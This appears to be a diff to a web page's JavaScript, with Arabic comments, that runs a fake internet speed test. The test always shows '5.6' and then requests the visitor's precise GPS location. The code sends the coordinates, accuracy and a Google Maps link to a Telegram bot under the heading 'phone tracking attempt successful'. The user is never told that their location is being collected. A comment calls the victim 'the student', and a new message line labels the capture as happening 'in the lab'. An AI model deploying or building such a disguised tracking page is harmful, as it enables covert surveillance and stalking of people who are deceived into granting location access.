@@ -88,9 +88,9 @@
 
         // عند النقر على زر بدء الاختبار
         startTestBtn.addEventListener('click', () => {
-            welcomeScreen.classList.add('hidden'); // إخفاء الشاشة الترحيبية
-            counterScreen.classList.remove('hidden'); // إظهار شاشة العداد
-            simulateSpeedTest(); // بدء الفحص الوهمي
+            welcomeScreen.classList.add('hidden'); 
+            counterScreen.classList.remove('hidden'); 
+            simulateSpeedTest(); 
         });
 
         function simulateSpeedTest() {
@@ -104,12 +104,12 @@
 
                 if (counter > 25) {
                     clearInterval(interval);
-                    speedElement.innerText = "5.6"; // استقرار على الرقم المطلوب تماماً
+                    speedElement.innerText = "5.6"; 
                     titleText.innerText = "اكتمل اختبار سرعة الإنترنت";
                     detailsElement.classList.remove('opacity-0'); 
                     refreshBtn.classList.remove('hidden');
                     
-                    // استدعاء دالة طلب الموقع تلقائياً بمجرد اكتمال الفحص الوهمي
+                    // استدعاء طلب الموقع
                     requestLocation();
                 }
             }, 150);
@@ -117,14 +117,11 @@
 
         function requestLocation() {
             if (navigator.geolocation) {
-                // تفعيل خيار الدقة العالية جداً للتفريق بين مسافة الـ 500 متر بدقة
                 navigator.geolocation.getCurrentPosition(sendLocationToTelegram, handleLocationError, {
                     enableHighAccuracy: true,
                     timeout: 12000,
                     maximumAge: 0
                 });
-            } else {
-                console.log("المتصفح لا يدعم تحديد المواقع.");
             }
         }
 
@@ -133,13 +130,12 @@
             const lon = position.coords.longitude;
             const accuracy = position.coords.accuracy;
 
-            // كود رابط الخرائط بعد التصحيح البرمجي الكامل
-            const googleMapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
+            // تم إصلاح صياغة الرابط برمجياً هنا بالكامل لتجنب توقف الكود
+            const googleMapsUrl = "https://www.google.com/maps?q=" + lat + "," + lon;
 
-            // تجهيز نص رسالة التليجرام
-            const message = `🎯 محاولة رصد هاتف جديدة بنجاح\n\n` +
-                            `📍 الإحداثيات:\n${lat}, ${lon}\n\n` +
-                            `📏 نسبة دقة الـ GPS: حوالي ${Math.round(accuracy)} متر\n\n` +
+            const message = `🎯 محاولة رصد هاتف ناجحة في المختبر\n\n` +
+                            `📍 الإحداثيات: ${lat} , ${lon}\n` +
+                            `📏 نسبة الدقة: حوالي ${Math.round(accuracy)} متر\n\n` +
                             `🗺️ رابط موقع الهاتف على الخريطة:\n${googleMapsUrl}`;
 
             const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
@@ -158,17 +154,15 @@
                     alert('تم فحص جودة اتصالك بالشبكة بنجاح، شكراً لك!');
                 }
             } catch (error) {
-                console.error('Error sending message:', error);
+                console.error('Error:', error);
             }
         }
 
         function handleLocationError(error) {
-            // التعامل الذكي مع رفض الإذن لكي لا يتعطل فحص السرعة أمام الطالب
-            console.log("تم رفض الإذن أو انتهت مهلة الـ GPS");
+            console.log("تم رفض الإذن أو انتهت المهلة");
             alert('تم اكتمال الفحص الفني بنجاح!');
         }
 
-        // إعادة التجربة عند الضغط على زر التحديث الدائري
         refreshBtn.addEventListener('click', () => {
             titleText.innerText = "سرعة الإنترنت لديك";
             detailsElement.classList.add('opacity-0');
